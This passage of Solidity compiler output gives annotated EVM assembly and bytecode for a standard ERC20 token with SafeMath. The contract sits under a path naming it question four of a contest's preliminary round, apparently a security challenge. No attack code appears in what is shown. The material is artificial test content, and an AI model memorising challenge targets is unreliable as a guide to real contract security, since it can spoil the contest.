\"赛题-预赛/第四题/contracts/ERC20.sol\":3917:3996  _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue)) */\n      jump\t// in\n    tag_46:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4014:4018  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4007:4018  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n    tag_25:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1770:1777  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1797:1806  _balances */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1797:1815  _balances[account] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1807:1814  account */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1797:1815  _balances[account] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1790:1815  return _balances[account] */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n    tag_28:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4614:4618  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4631:4715  _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue)) */\n      tag_51\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4640:4650  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4652:4659  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4714  _allowances[msg.sender][spender].sub(subtractedValue) */\n      tag_52\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4698:4713  subtractedValue */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4672  _allowances */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4684  _allowances[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4673:4683  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4684  _allowances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4693  _allowances[msg.sender][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4685:4692  spender */\n      dup10\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4693  _allowances[msg.sender][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4697  _allowances[msg.sender][spender].sub */\n      tag_44\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4661:4714  _allowances[msg.sender][spender].sub(subtractedValue) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_52:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4631:4639  _approve */\n      tag_37\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4631:4715  _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue)) */\n      jump\t// in\n    tag_51:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4733:4737  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4726:4737  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_31:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2105:2109  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2122:2162  _transfer(msg.sender, recipient, amount) */\n      tag_54\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2132:2142  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2144:2153  recipient */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2155:2161  amount */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2122:2131  _transfer */\n      tag_41\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2122:2162  _transfer(msg.sender, recipient, amount) */\n      jump\t// in\n    tag_54:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2180:2184  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2173:2184  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n    tag_34:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2327:2334  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2365  _allowances */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2372  _allowances[owner] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2366:2371  owner */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2372  _allowances[owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2381  _allowances[owner][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2373:2380  spender */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2381  _allowances[owner][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2347:2381  return _allowances[owner][spender] */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7070:7405  function _approve(address owner, address spender, uint256 value) internal {\r... */\n    tag_37:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7180:7181  0 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7163:7182  owner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7163:7168  owner */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7163:7182  owner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7155:7223  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_57\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x24\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208\n      0x24\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_57:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7261:7262  0 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7242:7263  spender != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7242:7249  spender */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7242:7263  spender != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7234:7302  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_58\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_58:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7345:7350  value */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7326  _allowances */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7333  _allowances[owner] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7327:7332  owner */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7333  _allowances[owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7342  _allowances[owner][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7334:7341  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7342  _allowances[owner][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7350  _allowances[owner][spender] = value */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7382:7389  spender */\n      dup2\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7366:7397  Approval(owner, spender, value) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7375:7380  owner */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7366:7397  Approval(owner, spender, value) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7391:7396  value */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7366:7397  Approval(owner, spender, value) */\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7070:7405  function _approve(address owner, address spender, uint256 value) internal {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5138:5402  function _transfer(address sender, address recipient, uint256 amount) internal {\r... */\n    tag_41:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5248:5277  _balances[sender].sub(amount) */\n      tag_60\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5270:5276  amount */\n      dup2\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5248:5257  _balances */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5248:5265  _balances[sender] */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5258:5264  sender */\n      dup7\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5248:5265  _balances[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5248:5269  _balances[sender].sub */\n      tag_44\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5248:5277  _balances[sender].sub(amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_60:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5228:5237  _balances */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5228:5245  _balances[sender] */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5238:5244  sender */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5228:5245  _balances[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5228:5277  _balances[sender] = _balances[sender].sub(amount) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5311:5343  _balances[recipient].add(amount) */\n      tag_61\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5336:5342  amount */\n      dup2\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5311:5320  _balances */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5311:5331  _balances[recipient] */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5321:5330  recipient */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5311:5331  _balances[recipient] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5311:5335  _balances[recipient].add */\n      tag_48\n      swap1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5311:5343  _balances[recipient].add(amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_61:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5288:5297  _balances */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5288:5308  _balances[recipient] */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5298:5307  recipient */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5288:5308  _balances[recipient] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5288:5343  _balances[recipient] = _balances[recipient].add(amount) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5376:5385  recipient */\n      dup2\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5359:5394  Transfer(sender, recipient, amount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5368:5374  sender */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5359:5394  Transfer(sender, recipient, amount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5387:5393  amount */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5359:5394  Transfer(sender, recipient, amount) */\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":5138:5402  function _transfer(address sender, address recipient, uint256 amount) internal {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1315:1499  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n    tag_44:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1373:1380  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1406:1407  a */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1401:1402  b */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1401:1407  b <= a */\n      gt\n      iszero\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1393:1442  require(b <= a, \"SafeMath: subtraction overflow\") */\n      tag_63\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_63:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1453:1462  uint256 c */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1469:1470  b */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1465:1466  a */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1465:1470  a - b */\n      sub\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1453:1470  uint256 c = a - b */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1490:1491  c */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1483:1491  return c */\n      swap2\n      pop\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1315:1499  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":859:1040  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n    tag_48:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":917:924  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":937:946  uint256 c */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":953:954  b */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":949:950  a */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":949:954  a + b */\n      add\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":937:954  uint256 c = a + b */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":978:979  a */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":973:974  c */\n      dup2\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":973:979  c >= a */\n      lt\n      iszero\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":965:1011  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_65\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_65:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1031:1032  c */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1024:1032  return c */\n      swap2\n      pop\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":859:1040  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n    data_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029 45524332303a20617070726f766520746f20746865207a65726f2061646472657373\n    data_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208 45524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373\n\n    auxdata: 0xa265627a7a72315820e9e8e388a7cbcdd98757ff1018aed579d1b3728701042977cee25a9d4096dfc364736f6c63430005110032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610bae806100206000396000f3fe608060405234801561001057600080fd5b50600436106100885760003560e01c806370a082311161005b57806370a08231146101fd578063a457c2d714610255578063a9059cbb146102bb578063dd62ed3e1461032157610088565b8063095ea7b31461008d57806318160ddd146100f357806323b872dd146101115780633950935114610197575b600080fd5b6100d9600480360360408110156100a357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610399565b604051808215151515815260200191505060405180910390f35b6100fb6103b0565b6040518082815260200191505060405180910390f35b61017d6004803603606081101561012757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506103ba565b604051808215151515815260200191505060405180910390f35b6101e3600480360360408110156101ad57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061046b565b604051808215151515815260200191505060405180910390f35b61023f6004803603602081101561021357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610510565b6040518082815260200191505060405180910390f35b6102a16004803603604081101561026b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610558565b604051808215151515815260200191505060405180910390f35b610307600480360360408110156102d157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105fd565b604051808215151515815260200191505060405180910390f35b6103836004803603604081101561033757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610614565b6040518082815260200191505060405180910390f35b60006103a633848461069b565b6001905092915050565b6000600254905090565b60006103c7848484610892565b610460843361045b85600160008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610a2290919063ffffffff16565b61069b565b600190509392505050565b6000610506338461050185600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610aab90919063ffffffff16565b61069b565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60006105f333846105ee85600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610a2290919063ffffffff16565b61069b565b6001905092915050565b600061060a338484610892565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610721576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526024815260200180610b566024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156107a7576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610b346022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b6108e3816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610a2290919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610976816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610aab90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b600082821115610a9a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601e8152602001807f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525060200191505060405180910390fd5b600082840390508091505092915050565b600080828401905083811015610b29576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fe45524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373a265627a7a72315820e9e8e388a7cbcdd98757ff1018aed579d1b3728701042977cee25a9d4096dfc364736f6c63430005110032",
